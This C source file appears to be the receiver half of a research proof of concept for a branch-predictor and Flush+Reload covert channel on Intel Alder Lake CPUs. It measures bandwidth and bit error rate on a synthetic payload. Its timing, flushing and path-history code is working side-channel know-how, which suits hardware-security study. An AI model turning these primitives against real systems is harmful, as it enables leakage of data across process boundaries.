#include <errno.h>
#include <fcntl.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <x86intrin.h>

#include "message.h"

/* Clear the PHR (specifically designed for Intel Alder Lake processors) */
extern void clear_phr();
extern void shift_phr();
extern void set_phr(int input);

/* Cache Hit Threshold for Intel CPUs */
#define cache_hit_threshold 150

/* Number of iterations to train bpu. */
const size_t TRAINING = 128;

/* Number of samples (repeats of the entire attack). */
const size_t SAMPLE_COUNT = 100;

/* Victim Array */
uint8_t victim_array[64];

/* Victim Function's Boundary Check Value */
size_t VICTIM_COND = 32;

/* Probe Array */
#define PROBE_DIST 512
volatile uint8_t probe[256 * PROBE_DIST];

/********************************************************************
Helper Functions
********************************************************************/

typedef struct {
  size_t value;
  size_t index;
} IndexedValue;

/* Helper function for finding two largest values in an array */
void findTwoLargest(const size_t hits[], size_t size, IndexedValue *largest1,
                    IndexedValue *largest2) {
  *largest1 = (IndexedValue){0, 0};
  *largest2 = (IndexedValue){0, 0};
  for (size_t i = 0; i < size; ++i) {
    if (hits[i] > largest1->value) {
      largest2->value = largest1->value;
      largest2->index = largest1->index;
      largest1->value = hits[i];
      largest1->index = i;
    } else if (hits[i] > largest2->value) {
      largest2->value = hits[i];
      largest2->index = i;
    }
  }
}

/* Helper function for measuring the access time of ptr[index] */
uint64_t time_access(volatile void *ptr, size_t index) {
  ptr += index;
  uint32_t junk;
  uint64_t start = __rdtscp(&junk);
  __asm__ __volatile__("" : : "r"(*(volatile char *)ptr));
  // ptr[index]++;
  uint64_t end = __rdtscp(&junk);
  return end - start;
}

uint64_t time_access_dcache(volatile uint8_t *ptr, size_t index) {
  uint32_t junk;
  uint64_t start = __rdtscp(&junk);
  ptr[index]++;
  uint64_t end = __rdtscp(&junk);
  return end - start;
}

/* Helper function for flushing the memory referenced by ptr */
void flush(volatile void *ptr, size_t length) {
  uint8_t *byte_ptr = (uint8_t *)ptr;

  // Align to cache line
  length += (uintptr_t)byte_ptr & 0x3F;
  byte_ptr = (uint8_t *)((uintptr_t)byte_ptr & ~0x3F);

  // Flush every cacheline
  for (size_t i = 0; i < length; i += 64) {
    // Optimized CLFLUSH instruction for Intel CPUs
    __asm__ __volatile__("clflushopt (%0)\n\t"
                         :
                         : "r"(byte_ptr + i)
                         : "memory");
  }

  _mm_lfence();
}

/********************************************************************
Victim Code
********************************************************************/
/* Spy Target 1 */
void __attribute__((aligned(64))) target_spy() {
  __asm__ __volatile__("pop %rbp\n\t"
                       ".rept 131072\n\t"
                       "ret\n\t"
                       ".endr\n\t");
}

/* Victim Function : Spy */
void __attribute__((aligned(64))) victim_spy(int input) {

  void (*spy_indirect_branch)();
  spy_indirect_branch = target_spy;

  __asm__ __volatile__(".align 1<<16\n\t");
  clear_phr();
  set_phr(0);
  if (input < VICTIM_COND) {
    int offset = PROBE_DIST * victim_array[input];
    spy_indirect_branch += offset;
    spy_indirect_branch();
  }

  return;
}

/* Benign Target 0 */
void benign_target0() { return; }

/* Benign Target 1 */
void benign_target1() { return; }

/* Victim Function : Main */
void victim_function(int input) {

  void (*victim_indirect_branch)();
  if (input == 0)
    victim_indirect_branch = benign_target0;
  else
    victim_indirect_branch = benign_target1;

  _mm_clflush(&victim_indirect_branch);
  _mm_mfence();

  __asm__ __volatile__(".align 1<<16\n\t");
  clear_phr();
  set_phr(input);

  __asm__ __volatile__(".rept 52\n\t"
                       "nop\n\t"
                       ".endr\n\t");
  victim_indirect_branch();

  return;
}

/********************************************************************
Main Function
********************************************************************/
/* Harness helpers are only declared here and defined below main(), so that
   no code is emitted ahead of the victim functions above.  See
   MEASUREMENT.md, "Code layout invariant". */
static void parse_args(int argc, const char **argv, size_t *msg_len,
                       size_t *repeat);
static void gen_message(uint8_t *buf, size_t len, uint32_t seed);
static int sem_wait_timeout(sem_t *sem, int seconds);
static double elapsed_sec(const struct timespec *a, const struct timespec *b);

int main(int argc, const char **argv) {

  size_t msg_len = MSG_LEN;
  size_t repeat = MSG_REPEAT;
  parse_args(argc, argv, &msg_len, &repeat);

  printf("\nPoC: Reader (receiver)\n");
  printf("----------------------------\n");
  printf("payload      : %zu bytes (seed 0x%08x)\n", msg_len, MSG_SEED);
  printf("rounds/byte  : %zu\n", repeat);
  fflush(stdout);

  /* Initialize Victim Array */
  for (size_t i = 0; i < 64; i++) {
    victim_array[i] = i;
  }

  uint8_t *tx = (uint8_t *)malloc(msg_len); /* ground truth */
  uint8_t *rx = (uint8_t *)malloc(msg_len); /* what we decode */
  if (tx == NULL || rx == NULL) {
    perror("malloc");
    return 1;
  }
  gen_message(tx, msg_len, MSG_SEED);
  memset(rx, 0, msg_len);

  /* The transmitter creates the semaphores, so retry until it has. */
  sem_t *sem_1 = SEM_FAILED;
  sem_t *sem_2 = SEM_FAILED;
  for (int attempt = 0; attempt < 10 * SYNC_TIMEOUT_SEC; attempt++) {
    sem_1 = sem_open("/sem1", 0);
    sem_2 = sem_open("/sem2", 0);
    if (sem_1 != SEM_FAILED && sem_2 != SEM_FAILED)
      break;
    if (sem_1 != SEM_FAILED)
      sem_close(sem_1);
    if (sem_2 != SEM_FAILED)
      sem_close(sem_2);
    usleep(100000);
  }
  if (sem_1 == SEM_FAILED || sem_2 == SEM_FAILED) {
    fprintf(stderr, "sem_open: transmitter never showed up\n");
    return 1;
  }

  size_t hits[256];
  size_t decoded = 0;
  size_t no_signal = 0;
  unsigned long long margin_sum = 0;

  struct timespec t_start, t_end;
  clock_gettime(CLOCK_MONOTONIC, &t_start);

  for (size_t b = 0; b < msg_len; b++) {

    /* Hits accumulate over the rounds of this byte only. */
    memset(hits, 0, sizeof(hits));

    for (size_t r = 0; r < repeat; r++) {
      if (sem_wait_timeout(sem_2, SYNC_TIMEOUT_SEC) != 0) {
        fprintf(stderr,
                "\n[reader] timed out waiting for the transmitter "
                "(byte %zu, round %zu) - aborting\n",
                b, r);
        goto done;
      }
      // Reset cache state (Flush)
      flush(target_spy, 256 * PROBE_DIST);

      victim_function(0);
      victim_function(0);
      victim_function(0);
      victim_function(0);
      _mm_mfence();

      /* Read cache status (Reload) */
      for (size_t p = 0; p < 256; p++) {
        size_t mix_i = ((p * 167) + 13) & 255;
        size_t acc_time = time_access(target_spy, mix_i * PROBE_DIST);
        if (acc_time < cache_hit_threshold)
          hits[mix_i]++;
      }
      sem_post(sem_1);
    }

    /* Decode: the index with the highest number of cache hits wins. */
    IndexedValue largest1, largest2;
    findTwoLargest(hits, sizeof(hits) / sizeof(hits[0]), &largest1, &largest2);
    rx[b] = (uint8_t)largest1.index;
    decoded = b + 1;

    /* A byte with zero hits anywhere decodes as index 0 by default; count
       those separately so a silent channel is not mistaken for a run of
       0x00 bytes that happen to be correct. */
    if (largest1.value == 0)
      no_signal++;
    margin_sum += largest1.value - largest2.value;

    if ((b & 63) == 63) {
      double so_far = 0.0;
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      so_far = elapsed_sec(&t_start, &now);
      fprintf(stderr, "\r  %zu/%zu bytes  (%.1f s elapsed, ~%.0f s left)   ",
              decoded, msg_len, so_far,
              so_far / (double)decoded * (double)(msg_len - decoded));
      fflush(stderr);
    }
  }

done:
  clock_gettime(CLOCK_MONOTONIC, &t_end);
  fprintf(stderr, "\n");

  double secs = elapsed_sec(&t_start, &t_end);

  /* Bit error rate over the bytes we actually received. */
  size_t bit_errors = 0;
  size_t byte_errors = 0;
  for (size_t b = 0; b < decoded; b++) {
    unsigned diff = (unsigned)(tx[b] ^ rx[b]);
    if (diff != 0)
      byte_errors++;
    bit_errors += (size_t)__builtin_popcount(diff);
  }

  size_t total_bits = decoded * 8;
  double ber = total_bits ? (double)bit_errors / (double)total_bits : 0.0;
  double byte_er = decoded ? (double)byte_errors / (double)decoded : 0.0;

  printf("\nfirst 16 bytes sent : ");
  for (size_t b = 0; b < 16 && b < decoded; b++)
    printf("%02x ", tx[b]);
  printf("\nfirst 16 bytes recvd: ");
  for (size_t b = 0; b < 16 && b < decoded; b++)
    printf("%02x ", rx[b]);
  printf("\n");

  printf("\n=== Covert Channel Measurement ===\n");
  printf("payload             : %zu bytes (%zu bits)\n", decoded, total_bits);
  printf("rounds per byte     : %zu\n", repeat);
  printf("total rounds        : %zu\n", decoded * repeat);
  printf("wall time           : %.3f s\n", secs);

  printf("\n--- Bandwidth ---\n");
  if (secs > 0.0) {
    printf("throughput          : %.2f bit/s  (%.2f B/s)\n",
           (double)total_bits / secs, (double)decoded / secs);
    printf("time per byte       : %.3f ms\n", secs * 1e3 / (double)decoded);
    printf("time per round      : %.3f ms\n",
           secs * 1e3 / (double)(decoded * repeat));
  }

  printf("\n--- Accuracy ---\n");
  printf("bit errors          : %zu / %zu   (BER = %.4e)\n", bit_errors,
         total_bits, ber);
  printf("byte errors         : %zu / %zu   (byte error rate = %.4e)\n",
         byte_errors, decoded, byte_er);
  printf("bytes with no signal: %zu\n", no_signal);
  printf("mean decode margin  : %.1f hits (top1 - top2, of %zu rounds)\n",
         decoded ? (double)margin_sum / (double)decoded : 0.0, repeat);

  /* Single machine-readable line for the run script to collect. */
  printf("\nRESULT,bytes=%zu,repeat=%zu,seconds=%.6f,bits_per_sec=%.4f,"
         "ber=%.6e,byte_er=%.6e,no_signal=%zu\n",
         decoded, repeat, secs,
         secs > 0.0 ? (double)total_bits / secs : 0.0, ber, byte_er,
         no_signal);

  sem_close(sem_1);
  sem_close(sem_2);
  free(tx);
  free(rx);

  return 0;
}

/********************************************************************
Harness Helpers (defined after main to preserve the code layout)
********************************************************************/
/* Accepts the key=value style used by the other run scripts in this tree,
   e.g. ./ibp_leakage_reader.out msg_len=1024 repeat=100 */
static void parse_args(int argc, const char **argv, size_t *msg_len,
                       size_t *repeat) {
  for (int i = 1; i < argc; i++) {
    const char *eq = strchr(argv[i], '=');
    if (eq == NULL) {
      fprintf(stderr, "warning: ignoring unrecognized option '%s'\n", argv[i]);
      continue;
    }
    size_t klen = (size_t)(eq - argv[i]);
    unsigned long value = strtoul(eq + 1, NULL, 0);
    if (klen == 7 && strncmp(argv[i], "msg_len", 7) == 0)
      *msg_len = (size_t)value;
    else if (klen == 6 && strncmp(argv[i], "repeat", 6) == 0)
      *repeat = (size_t)value;
    else
      fprintf(stderr, "warning: ignoring unrecognized option '%s'\n", argv[i]);
  }
}

/* Deterministic payload.  Transmitter and receiver derive the identical
   byte stream from the same seed, so the receiver knows the ground truth
   and can compute the bit error rate without any side path. */
static void gen_message(uint8_t *buf, size_t len, uint32_t seed) {
  uint32_t s = seed;
  for (size_t i = 0; i < len; i++) {
    s = s * 1103515245u + 12345u;
    buf[i] = (uint8_t)(s >> 16);
  }
}

/* sem_wait() that gives up instead of hanging forever if the peer dies or
   the two sides fall out of lockstep. */
static int sem_wait_timeout(sem_t *sem, int seconds) {
  struct timespec ts;
  clock_gettime(CLOCK_REALTIME, &ts);
  ts.tv_sec += seconds;
  while (sem_timedwait(sem, &ts) != 0) {
    if (errno == EINTR)
      continue;
    return -1;
  }
  return 0;
}

static double elapsed_sec(const struct timespec *a, const struct timespec *b) {
  return (double)(b->tv_sec - a->tv_sec) +
         (double)(b->tv_nsec - a->tv_nsec) / 1e9;
}
